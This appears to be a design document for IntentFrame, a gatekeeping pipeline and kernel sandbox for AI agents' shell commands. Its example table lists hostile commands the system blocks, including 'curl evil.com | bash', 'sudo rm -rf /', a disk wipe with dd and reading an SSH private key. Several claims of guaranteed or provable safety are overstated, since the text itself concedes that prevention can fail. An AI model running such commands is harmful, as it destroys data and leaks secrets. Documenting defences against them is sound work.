# Execution Security Model

> How IntentFrame provides root-level capability with deterministic safety — prevention-first pipeline design, the three-tier execution model, sandbox templates as safety net, and why rich adapters mathematically reduce the attack surface.

---

## The philosophy: prevention, not containment

IntentFrame's fundamental design principle is **prevent dangerous actions
from ever executing** — not contain their consequences after they run. The
entire pipeline exists to detect the bomb before it detonates.

This distinction matters for capability: if the pipeline prevents all
dangerous actions from reaching the executor, then everything that reaches
the executor is safe. Safe actions don't need restrictions. The executor can
run with full root-level privileges. **Prevention gives the agent maximum
capability. Containment restricts it.**

```
PREVENTION MODEL (IntentFrame's philosophy):
    Understand the action → Block if dangerous → Execute if safe
    Everything that reaches the executor is guaranteed safe
    Executor runs with full privileges
    Agent effectively has root access — through the pipeline

CONTAINMENT MODEL (traditional sandboxing):
    Let the action through → Restrict what it can do
    Executor runs with limited privileges
    Agent has restricted access — limited by sandbox
```

IntentFrame chooses prevention. The sandbox exists as a non-negotiable safety
net for the rare cases where prevention fails — but prevention is the
product, the USP, and the reason agents get full capability.

---

## The prevention pipeline for `RUN_COMMAND`

Not all actions need the same scrutiny. Most IntentFrame actions (file reads,
email, calendar, contacts) are executed by **typed adapters** — IntentFrame's
own trusted code that does one specific, bounded operation. These are safe by
construction and need no special prevention beyond the standard pipeline.

`RUN_COMMAND` is the one action type that spawns a subprocess with arbitrary
code. The prevention pipeline for `RUN_COMMAND` is therefore deeper than for
any other action — multiple independent layers, each catching what the others
miss:

```
RUN_COMMAND intent arrives
    │
    ├── GATE 1: command_shield (deterministic inspection — fact producer)
    │   338+ compiled regex patterns, bashlex structural decomposition,
    │   interpreter-indirection re-scan, containment-edge walk, optional
    │   resolved-script code inspection (AST for Python, regex for shell).
    │   Produces CommandReport with:
    │     verdict       → CATASTROPHIC | NEEDS_REVIEW | SAFE
    │     capabilities  → tuple of capability:* tags
    │     signals       → edge:*, resolved:*, structural findings
    │     code_intel    → deterministic findings from resolved code
    │   CATASTROPHIC → BLOCK immediately. No DG, no AE, no AI Guardian.
    │   ── Deterministic. Cannot be prompt-injected. ──
    │
    ├── GATE 2: DeterministicGuardian (pre-AE deterministic pass)
    │   Consumes the shield's report + user policy. Three outcomes:
    │     BLOCK     ← permission violation, constraint violation, or
    │                  domain hard gate.
    │     ALLOW     ← passive-read short-circuit OR RUN_COMMAND read-only
    │                  short-circuit.
    │     UNDECIDED ← no deterministic verdict; fall through to Gates 3–4.
    │   ── Deterministic. Cannot be prompt-injected. ──
    │
    ├── GATE 3: Analysis Engine (semantic understanding — UNDECIDED only)
    │   AI understands what the command ACTUALLY does.
    │   Stated intent vs actual behavior. Hidden behaviors. Scope mismatch.
    │   Risk assessment. Semantic domain classification.
    │   ── Semantic. Catches novel threats through reasoning. ──
    │
    ├── GATE 4: AI Guardian (policy + semantic judgment — UNDECIDED only)
    │   Internal deterministic re-check (belt-and-braces).
    │   Fast-path (no AI) when permission.safe AND no AE risk flags.
    │   Otherwise: LLM evaluates hidden behaviors, scope mismatches,
    │   risk factors, intent limits.
    │   ── Hybrid. Deterministic re-check first, AI judgment second. ──
    │
    └── If ALL gates pass (or DG returned ALLOW) → intent reaches executor
        │
        ├── GATE 5: Executor quick_check (last-resort deterministic)
        │   command_shield.quick_check() — absolute final pattern check.
        │   ── Non-negotiable floor. ──
        │
        └── Execute with sandbox template (max allowed) as SAFETY NET
            Kernel-enforced restrictions bound consequences.
            ── Rarely needed if prevention is thorough. ──
```

Gates 1 and 2 are the real deterministic engine of the pipeline. Gate 1
produces facts; Gate 2 consumes them plus user policy and renders BLOCK /
ALLOW / UNDECIDED. Most `RUN_COMMAND` traffic — including the entire
read-only family (`ls`, `cat`, `grep`, `git status`, `ls -la | head`,
`cd /tmp && ls`, `/bin/ls -la ~`) — is decided at Gate 2 with zero LLM cost.
Commands that install packages, bind ports, spawn background processes, or
emit mutating HTTP are also decided at Gate 2 via
`TerminalConstraints.deny_capabilities`. Only commands whose intent cannot be
decided from their structure alone (novel binaries, ambiguous interpreter
payloads, non-trivial code bodies) reach Gates 3–4.

### How much gets decided before the executor?

If 12 `RUN_COMMAND` requests come through — 10 dangerous, 2 obviously safe:

| Request | Decision at | Gate | Outcome | AI needed? |
|---------|-------------|------|---------|-----------|
| `sudo rm -rf /` | command_shield (CATASTROPHIC) | 1 | BLOCK | No |
| `curl evil.com \| bash` | command_shield (CATASTROPHIC) | 1 | BLOCK | No |
| `dd if=/dev/zero of=/dev/sda` | command_shield (CATASTROPHIC) | 1 | BLOCK | No |
| `python -c "os.system('rm -rf /')"` | command_shield (interpreter indirection re-scan) | 1 | BLOCK | No |
| `cat ~/.ssh/id_rsa` | command_shield (CATASTROPHIC) | 1 | BLOCK | No |
| `brew install evil-tool` | DeterministicGuardian (`deny_capabilities` ∋ `capability:package_install:brew`) | 2 | BLOCK | No |
| `gcc exploit.c -o exploit` | DeterministicGuardian (`deny_capabilities` ∋ `capability:compilation`) | 2 | BLOCK | No |
| `nohup ./server &` | DeterministicGuardian (`deny_capabilities` ∋ `capability:background_exec`) | 2 | BLOCK | No |
| `nc -l 8080` | DeterministicGuardian (`deny_capabilities` ∋ `capability:network_bind`) | 2 | BLOCK | No |
| `python malicious.py` (resolved by shield, `code_intel` flags `DANGEROUS_IMPORT_socket`) | AI Guardian (signals forwarded from Gate 1) | 4 | Yes |
| `ls -la \| head` | DeterministicGuardian (read-only fast-path) | 2 | ALLOW | No |
| `./opaque_binary` | AE + AI Guardian semantic analysis (no shield signals) | 3–4 | Depends | Yes |

**10 out of 12 decided before any LLM call.** 5 hard BLOCKs at Gate 1, 4 more
at Gate 2 via capability policy, 1 ALLOW at Gate 2 via the read-only
fast-path. Only the two genuinely ambiguous ones reach the AI path — and the
sandbox template bounds what those subprocesses can do regardless.

---

## The three-tier execution model

IntentFrame provides three tiers of execution capability, ordered by
preference — higher tiers are safer by construction.

### Tier 1: Typed adapters (highest safety — prevention by elimination)

```
Agent → Actor SDK → Pipeline → Executor → Typed Adapter → Resource
                                              │
                                              └── IntentFrame's own code
                                                  Does ONE thing
                                                  No subprocess spawned
                                                  No arbitrary code runs
                                                  Bounded blast radius
```

Typed adapters are IntentFrame's built-in capability modules. Each adapter
handles a specific set of actions with typed parameters, validated schemas,
and deterministic behavior.

| Adapter | Actions | Why it's safe |
|---------|---------|---------------|
| FilesAdapter | `READ_FILE`, `WRITE_FILE`, `LIST_DIRECTORY`, `DELETE_FILE` | VFS enforces path boundaries. No subprocess. |
| EmailAdapter | `SEND_EMAIL`, `READ_EMAIL`, `SEARCH_EMAIL` | Recipients checked against policy. Content visible to AE. |
| CalendarAdapter | `LIST_EVENTS`, `CREATE_EVENT`, `UPDATE_EVENT` | TCC-gated on macOS. Scoped to EventKit. |
| RemindersAdapter | `LIST_REMINDERS`, `CREATE_REMINDER` | TCC-gated. Scoped to EventKit. |
| ContactsAdapter | `SEARCH_CONTACTS`, `GET_CONTACT` | TCC-gated. Read-only. |
| HttpApiAdapter | `HTTP_GET`, `HTTP_POST` | URL visible in intent. AE flags exfiltration patterns. |
| UserIOAdapter | `ASK_USER`, `SHOW_MESSAGE`, `GET_CONFIRMATION` | Content visible to AE for social-engineering detection. |
| FinanceAdapter | `PAY_INVOICE` | Finance domain hard gate. Max amount constraint. |
| DataAdapter | `APPEND_ROW` | VFS restricts target. Schema validation. |

**Why typed adapters don't need OS sandboxing:**

1. **No subprocess** — the adapter itself does the work. No code escapes the pipeline.
2. **Typed parameters** — data is structured and visible to AE/Guardian. Not hidden in opaque code.
3. **Bounded blast radius** — each adapter does ONE thing to ONE resource. The worst case is known.
4. **Trusted code** — IntentFrame developers wrote the adapter. It's reviewed, tested, and accountable.

Typed adapters are the **ultimate prevention** — they eliminate the threat
class entirely. There's no bomb to detect because there's no arbitrary code
to run. The adapter IS the security boundary.

### Tier 2: Sandboxed code execution (prevention + safety net)

```
Agent → Actor SDK → Prevention Pipeline (5 gates) → Executor → Sandbox → Subprocess
                         │                                        │
                         │ Blocks 99%+ of dangerous commands      │ Safety net for
                         │ BEFORE they reach the executor         │ the <1% that
                         │                                        │ slips through
                         └── PREVENTION (primary)                 └── CONTAINMENT (backup)
```

When typed adapters are insufficient, the agent can execute shell commands
via `RUN_COMMAND`. This is the only action type that spawns a subprocess with
arbitrary code — and therefore the only one that needs both the full
prevention pipeline AND the sandbox safety net.

The prevention pipeline (Gates 1–5) blocks the vast majority of dangerous
commands deterministically, before they ever reach the executor. The sandbox
template is applied by the executor as the last layer — a kernel-enforced
restriction profile that bounds consequences IF prevention fails.

See [Sandbox templates](#sandbox-templates) below for the full design.

### Tier 3: Trusted registered agents (delegated execution)

```
Agent → Jarvis → delegate_to_agent("invoice_bot") → Registered Agent
                                                        │
                                                        ├── Own Actor SDK instance
                                                        ├── Own LLM loop
                                                        ├── Manifest-declared capabilities
                                                        └── Every action → same Pipeline
```

For complex workflows that require a dedicated agent (not just a shell
command), Jarvis delegates to a registered agent. The registered agent:

1. Declares its capabilities in `manifest.yaml` (like Android's `AndroidManifest.xml`)
2. Connects via its own Actor SDK instance
3. Every action goes through the same IntentFrame pipeline
4. Is subject to the same policy, analysis, and prevention enforcement

Registered agents are the "app" model — vetted, manifest-declared,
pipeline-mediated. Their code runs through IntentFrame, not outside it.

### Tier preference

```
PREFER: Tier 1 (adapters)    → no code, no risk, prevention by elimination
THEN:   Tier 3 (registered)  → vetted agent, manifest-declared, pipeline-mediated
LAST:   Tier 2 (sandboxed)   → arbitrary code, prevention pipeline + sandbox safety net

The less code agents write, the less prevention needs to catch.
```

---

## Why `RUN_COMMAND` is the only action needing this full pipeline

Every adapter-mediated action shares three properties that make the extended
prevention pipeline unnecessary:

| Property | Adapter actions | `RUN_COMMAND` |
|----------|----------------|-------------|
| **Subprocess spawned?** | No — adapter itself does the work | Yes — arbitrary process |
| **Parameters visible?** | Yes — typed, structured, visible to AE/Guardian | Partially — command string visible, but code behavior is opaque |
| **Blast radius bounded?** | Yes — adapter does ONE thing | No — subprocess can do anything the OS allows |
| **Prevention needed?** | Standard pipeline is sufficient | Full 5-gate prevention pipeline + sandbox safety net |

Adapters don't need Gate 1 (`command_shield`) or Gate 2's `RUN_COMMAND`
capability-policy machinery because there's no command string or arbitrary
code to analyse. They don't need sandbox templates because there's no
subprocess to contain. Their "sandbox" is the adapter implementation itself
— bounded by design.

---

## Sandbox templates (safety net)

Sandbox templates are the safety net beneath the prevention pipeline. They
are enum-based, kernel-enforced restriction profiles applied by the executor
to every `RUN_COMMAND` subprocess.

**The sandbox is NOT the primary defense.** The prevention pipeline (Gates
1–5) is. The sandbox exists for the rare case where all prevention gates
pass but the command's consequences exceed what was anticipated. It bounds
the damage when prevention fails.

> **Implementation reference:** [`../../executor/sandbox.md`](../../executor/sandbox.md)
> — full module docs, SBPL profile structure, test coverage.

### Template definitions

```python
class SandboxTemplate(str, Enum):
    PURE_COMPUTE     = "pure_compute"
    FILE_READ_ONLY   = "file_read_only"
    FILE_READ_WRITE  = "file_read_write"
    NETWORK_OUTBOUND = "network_outbound"
    NETWORK_FULL     = "network_full"
    UNRESTRICTED     = "unrestricted"
```

| Template | File read | File write | Net out | Net bind | Fork | Signal |
|----------|-----------|------------|---------|----------|------|--------|
| PURE_COMPUTE | No | No | No | No | No | No |
| FILE_READ_ONLY | Allowed paths | No | No | No | No | No |
| FILE_READ_WRITE | Allowed paths | Allowed paths | No | No | No | No |
| NETWORK_OUTBOUND | Allowed paths | Allowed paths | Yes | No | No | No |
| NETWORK_FULL | Allowed paths | Allowed paths | Yes | Yes | Limited | No |
| UNRESTRICTED | Allowed paths | Allowed paths | Yes | Yes | Yes | No |

**All templates share a non-negotiable deny base** (enforced last in the SBPL
profile — overrides all allows):

- Cannot write to system paths (`/System`, `/usr`, `/bin`, `/sbin`)
- Cannot write to persistence paths (`/Library/LaunchDaemons`, `/Library/LaunchAgents`, `~/Library/LaunchAgents`)
- Cannot read or write IntentFrame runtime data (`~/.intentframe/`)
- Cannot remove own sandbox (macOS Seatbelt is one-way)

### How it works

The sandbox is **entirely internal to the executor**. The agent, pipeline,
Guardian, and wire protocol know nothing about it.

```
TerminalAdapter.execute()
    ├── command_shield.quick_check()     Gate 5: last-resort patterns
    ├── planner.plan(cwd)                uses max(allowed_templates) from config
    │       ├── reads allowed_write_paths from SandboxConfig
    │       ├── canonicalizes all paths (realpath)
    │       └── applies non-negotiable deny lists
    ├── engine.wrap(command, plan)        builds SBPL profile, wraps command
    │       └── sandbox-exec -p '<profile>' /bin/sh -c '<command>'
    └── asyncio.create_subprocess_exec(*argv)
```

Key implementation decisions:

- **Executor-only**: No sandbox fields on IntentFrame, RuntimeContext, or any pipeline type. Configured via `executor.yaml`.
- **Dynamic SBPL generation**: The entire Seatbelt profile is built in Python — no static `.sbpl` file.
- **Single template per deployment**: All commands run under `max(allowed_templates)`.
- **Path canonicalization**: All paths resolved via `os.path.realpath()`. Critical on macOS where `/var` → `/private/var`.
- **Controlled `TMPDIR`**: Sandboxed commands use `/tmp/intentframe`.
- **Deny overrides last**: Seatbelt uses last-match-wins.
- **Fail-closed**: If the sandbox engine is unavailable, every `RUN_COMMAND` is rejected.

### Template selection

All commands run under `max(allowed_templates)` — the highest-privilege
template in the `allowed_templates` list from `executor.yaml`. There is no
per-command classification or dynamic narrowing.

This is intentional: the prevention pipeline (Gates 1–5) is responsible for
blocking dangerous commands. The sandbox is a safety net, not a policy
engine. Trying to infer the "right" template per command adds fragility
without meaningful security value when the prevention pipeline has already
approved the command.

### Executor config

```yaml
pack_options:
  sandbox:
    enabled: true
    allowed_templates:
      - pure_compute
      - file_read_only
      - file_read_write
      # All commands run under file_read_write (the max)
```

This is deployment config, not user policy. A Jarvis deployment that needs
network access would include `network_outbound` in the list — all commands
then run under `network_outbound`.

### Platform implementation (current: macOS)

| Platform | Mechanism | Status |
|----------|-----------|--------|
| macOS | `sandbox-exec` (Seatbelt / kernel MAC) | **Implemented** — dynamic SBPL profile generation, 126 tests including real kernel enforcement |
| Linux | `seccomp-bpf` or Bubblewrap | Planned — `SandboxEngine` ABC is platform-pluggable |
| Windows | Job Objects + Restricted Tokens | Planned |

No containers. No VMs. No installation. No startup latency. Zero overhead.
The sandbox is a kernel flag on the spawned process.

---

## How rich adapters reduce the attack surface

The relationship between adapter coverage and security risk is direct: every
adapter added permanently eliminates the need for `RUN_COMMAND` for that
operation, removing an entire class of threats from the prevention pipeline's
workload.

### The math

Let `A` be the set of all actions an agent performs. Let `T` be the subset
handled by typed adapters. Let `R = A − T` be the subset requiring
`RUN_COMMAND`.

For typed adapter actions:
- Prevention needed: standard pipeline only (AE + Guardian)
- Blast radius: bounded by adapter implementation
- Subprocess spawned: no
- Risk per action: **near zero**

For `RUN_COMMAND` actions:
- Prevention needed: full 5-gate pipeline
- Blast radius: bounded by sandbox template (if prevention fails)
- Subprocess spawned: yes
- Risk per action: **bounded but non-zero**

```
Total risk ∝ |R| × risk_per_RUN_COMMAND

As |T| increases → |R| decreases → Total risk decreases
```

| Scenario | Adapter-covered | `RUN_COMMAND` needed | Prevention workload |
|----------|----------------|-------------------|---------------------|
| No adapters | 0 | 20 | Maximum — every action needs full 5-gate pipeline |
| Basic adapters (file, email) | 8 | 12 | Large |
| Rich adapters (file, email, calendar, contacts, HTTP, data) | 17 | 3 | Small — only 3 edge cases need full prevention |
| Complete adapters | 20 | 0 | Zero — no arbitrary code, no prevention needed |

### Investment priority

```
Adding a new adapter = permanently eliminating a threat class
                     = reducing the prevention pipeline's burden
                     = making the "hard problem" smaller
                     = giving agents more capability without more risk

Every adapter is a security investment, not just a feature.
```

---

## How this maps to product tiers

### Gateway (filter-level security)

```
Agent (any MCP client)
    ↓ MCP protocol
IntentFrame Gateway
    ├── Pattern matching (Command Shield equivalent)
    ├── AI judgment (Analysis Engine + Guardian)
    └── Audit trail
    ↓ MCP protocol
Actual MCP Servers / APIs
```

**Security model:** Prevention only (semantic ceiling). The Gateway inspects
intents and blocks dangerous ones. If it approves a `RUN_COMMAND`, the
subprocess runs without restriction. No typed adapters. No sandbox templates.
No kernel enforcement.

The Gateway provides the prevention layer without the safety net.

### SDK (structural + prevention + safety net)

```
Agent (uses IntentFrame SDK)
    ↓ Actor SDK → signed IntentFrame
IntentFrame Pipeline
    ├── Command Shield + Capability Signals (deterministic prevention)
    ├── Code Content Analysis (session-aware prevention)
    ├── Analysis Engine (semantic prevention)
    ├── Guardian (policy + semantic prevention)
    └── Capability policy enforcement (deterministic signal checks)
    ↓ Approved intent
Executor (holds credentials, root-level access)
    ├── Typed adapter execution (Tier 1 — safe by construction)
    └── Sandboxed subprocess execution (Tier 2 — prevention + safety net)
```

**Security model:** Prevention-first with kernel safety net. The SDK provides
the full 5-gate prevention pipeline AND the sandbox safety net AND typed
adapter execution AND credential isolation. Prevention handles 99%+. The
sandbox catches the rest. Together, they provide root-level capability with
provable safety bounds.

---

## The relationship to VFS

|  | VFS | Kernel sandbox |
|---|---|---|
| **Enforcement level** | Application — Python code checks paths | Kernel — syscall denied before execution |
| **What it protects** | FilesAdapter actions (`READ_FILE`, `WRITE_FILE`, etc.) | `RUN_COMMAND` subprocess actions |
| **Scope** | File paths only | File, network, process, signal — all syscalls |
| **Bypassable?** | Yes — any code that doesn't go through FilesAdapter | No — kernel enforcement, no user-space bypass |
| **What it provides** | Clean abstraction (agents see virtual paths) | Safety guarantee (subprocess can't exceed admin-configured capabilities) |
| **Path source** | Mounts in `executor.yaml` | `sandbox:` section in `executor.yaml` (independent of VFS mounts) |

VFS provides the **abstraction layer** — agents interact with clean virtual
paths through typed file adapters. The sandbox provides the **enforcement
layer** — when agents use `RUN_COMMAND`, the kernel restricts what the
subprocess can access. The sandbox's allowed paths are configured
independently in `SandboxConfig` (not derived from VFS mounts), because
`RUN_COMMAND` operates on real filesystem paths and is decoupled from the
virtual path layer.

---

## Principles

1. **Prevention is the primary defense.** IntentFrame's core value
   proposition is blocking dangerous actions BEFORE they execute — not
   containing their consequences after. The prevention pipeline (Command
   Shield, capability signals, code content analysis, AE, Guardian) is the
   product. The sandbox is the safety net.

2. **Typed adapters are the ultimate prevention.** They eliminate the threat
   class entirely. No arbitrary code means no bomb to detect. The richer the
   adapter library, the smaller the attack surface, the less prevention
   logic is needed.

3. **`RUN_COMMAND` is the exception, not the rule.** It is the only action
   type that spawns arbitrary code. It is the only one that needs the full
   5-gate prevention pipeline and the sandbox safety net. All other actions
   are safe by adapter design.

4. **Prevention gates are layered and independent.** Each gate catches what
   the others miss. Command Shield catches known patterns. Capability
   signals catch structural categories. Code content analysis catches
   write-then-execute chains. AE catches semantic threats. Guardian enforces
   policy. No single gate failure is catastrophic.

5. **Deterministic prevention before semantic prevention.** Gates 1–2 run
   before any AI call, and AI Guardian's internal deterministic re-check
   runs before its LLM judgment. Most dangerous commands are blocked — and
   most safe commands allowed — without spending a single LLM token. AI
   judgment is the last resort in the prevention pipeline, not the first.

6. **Sandbox templates are admin-configured privilege ceilings.** The
   deployment admin sets `allowed_templates` in `executor.yaml`. All commands
   run under `max(allowed_templates)`. The sandbox is not a per-command
   policy engine — it is a consistent safety net that bounds what any
   subprocess can do, regardless of what the prevention pipeline decided.

7. **The sandbox is the non-negotiable safety net.** Even if all prevention
   gates fail (which is theoretically possible — Rice's theorem), the
   sandbox template limits what the subprocess CAN do at the kernel level.
   This is the mathematical guarantee that makes root-level access provably
   safe.

8. **The base sandbox is universal.** All templates share a non-negotiable
   base: no system file writes, no device access, no IntentFrame tampering,
   no process signaling, no persistence mechanisms. This base protects the
   OS and IntentFrame regardless of prevention quality.

9. **Every adapter is a security investment.** Adding a new typed adapter
   permanently eliminates a class of attacks. Engineering effort on adapters
   directly reduces the prevention pipeline's burden and the sandbox's
   responsibility.

10. **Prevention gives capability. Containment restricts it.** The more
    threats the pipeline prevents, the fewer restrictions the executor
    needs. Maximum prevention = maximum capability = effective root access
    through the pipeline. This is why prevention-first is IntentFrame's
    philosophy — it's the only model where full capability and full safety
    coexist.

---

## Related documents

- [../executor.md](../executor.md) — The Executor overview
- [architecture.md](architecture.md) — Internal architecture and adapter pattern
- [why-foundation.md](why-foundation.md) — Why the Executor is the structural foundation
- [../architecture.md](../architecture.md) — Overall pipeline architecture
- [../threat-model.md](../threat-model.md) — What IntentFrame protects against
- [../why-not-injection-shield.md](../why-not-injection-shield.md) — Why no dedicated injection detector
- [`../../executor/sandbox.md`](../../executor/sandbox.md) — Kernel sandbox implementation reference
